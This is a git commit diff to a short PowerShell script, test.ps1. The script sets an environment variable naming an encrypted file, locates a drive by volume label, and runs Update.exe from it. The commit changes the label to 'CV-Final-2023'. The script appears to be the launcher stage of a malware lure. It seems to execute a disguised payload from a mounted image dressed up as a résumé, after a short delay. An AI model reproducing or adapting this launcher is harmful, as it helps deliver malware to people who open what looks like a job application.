eed4e180007546d3c526255015c39fd10cf6d5d2
RkDx <61869865+RkDx@users.noreply.github.com>
2022-10-02 01:56:09 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,5 +1,5 @@
 $Env:hagrid="mdll s0.enc";
-$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-d065c789ca4aede" | foreach { $_.DeviceID });
+$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-Final-2023" | foreach { $_.DeviceID });
 cd $device;
 sleep 10;
 .\Update.exe
